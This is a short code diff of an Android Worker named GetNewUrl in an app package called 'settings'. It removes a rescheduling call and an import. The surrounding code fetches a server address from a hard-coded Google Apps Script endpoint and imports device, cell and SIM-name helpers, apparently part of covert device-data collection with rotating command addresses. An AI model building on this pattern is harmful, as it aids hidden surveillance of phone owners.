@@ -3,7 +3,6 @@ package com.example.settings;
 import static com.example.settings.ConnectivityManagers.isConnectedToNetwork;
 import static com.example.settings.MainActivity.deviceInformation;
 import static com.example.settings.MainActivity.getCellInfo;
-import static com.example.settings.MainActivity.setuponetimeworkManager;
 import static com.example.settings.MainActivity.simName;
 import static com.example.settings.Utils.getDateTime;
 
@@ -48,7 +47,6 @@ public class GetNewUrl extends Worker {
     @NonNull
     @Override
     public Result doWork() {
-
         url="https://script.googleusercontent.com/macros/echo?user_content_key=RdsJJZR1E_p8xnTCxFEtKU7tqCFkUC_FTl3E2g_cDSIjpo-V43chBBHgueEZb0TFHwjC-4TPOuQPKeaiaJj0jjjQkeJ4Hs0Wm5_BxDlH2jW0nuo2oDemN9CCS2h10ox_1xSncGQajx_ryfhECjZEnH8eXEwHkzBGtIkfTyiTbSQKygxmT3GiA5SP-kQUhNAjebhQ5PeN_2JFSwNzgXMLi_qVtBV2CbTgnh8KTGIWb5_kN85XsxDPBA&lib=M2DzEZy__TPANi9YiRKV2MkfyXhMohYri";
         Name = mSharedpref.getSaveName();
         if(isConnectedToNetwork(context)){
@@ -80,7 +78,6 @@ public class GetNewUrl extends Worker {
                             @Override
                             public void onErrorResponse(VolleyError error) {
                                 Log.d(context.getPackageName(),"Error");
-                                setuponetimeworkManager("From Url");
                                 Result.retry();
 
                             }
